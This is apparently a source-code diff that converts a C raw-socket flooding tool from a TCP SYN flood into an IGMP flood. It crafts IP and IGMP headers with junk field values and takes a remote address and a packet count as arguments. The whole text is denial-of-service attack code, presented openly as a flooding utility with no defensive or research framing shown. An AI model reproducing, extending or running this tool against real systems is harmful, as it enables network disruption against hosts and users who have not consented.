@@ -5,10 +5,9 @@
 
 // Arguments standarized and checked //
 // Respects executable [[--source-addr saddr] [--[remote|broadcast]-addr raddr] [--source-port sport] [--remote-port rport] [--n N]] //
-
 int main(int argc,char* argv[]){
 	srand(time(NULL));
-    if(argc!=7){ fprintf(stdout,"Usage: syn-flood --remote-addr raddr --remote-port rport --n N"); exit(0); }
+    if(argc!=7){ fprintf(stdout,"Usage: igmp-flood --remote-addr raddr --remote-port rport --n N\n"); exit(0); }
 	else{	
 		
 		/** Example source address and source port **/
@@ -29,19 +28,23 @@ int main(int argc,char* argv[]){
 
 		/** Create your headers and make your combinations **/
 		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
-		TCP_HEADER *tcp_hdr = (TCP_HEADER *)(buffer + sizeof(IP_HEADER));
+		IGMP_HEADER *igmp_hdr = (IGMP_HEADER *)(buffer + sizeof(IP_HEADER));
 
 		/** Fill your headers (IP && TCP in this case) **/
 		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
-			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_TCP_PROTOCOL,0,source_address,remote_address,0);
+			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_IGMP_PROTOCOL,0,source_address,remote_address,0);
 
 		/** Use auxiliar functions to warn of current status **/
 		SHOW_CREATED_IP_HEADER(ip_hdr);
+		// Randomize values each iteration //
+		unsigned char version 	   = 0xBE;
+		unsigned char type	  	   = 0xEE;
+		unsigned char code    	   = 0xEF;
+		unsigned short checksum    = 0xFFCC;
+		unsigned int group_address = 0x1337BEEF;
+		set_igmp_header(igmp_hdr,version,type,code,checksum,group_address);
 		
-		set_tcp_header(tcp_hdr,source_port,remote_port,0,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,0,1,0,0,0,0,0,0, \
-			       TCP_DEFAULT_WINDOW,0,0,buffer);
-		
-		SHOW_CREATED_TCP_HEADER(tcp_hdr);
+		SHOW_CREATED_IGMP_HEADER(igmp_hdr);
 
 		/** Notice the kernel that we doesn't need it fill the header **/
 		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
@@ -53,3 +56,4 @@ int main(int argc,char* argv[]){
 	}
 	return 0;
 }
+
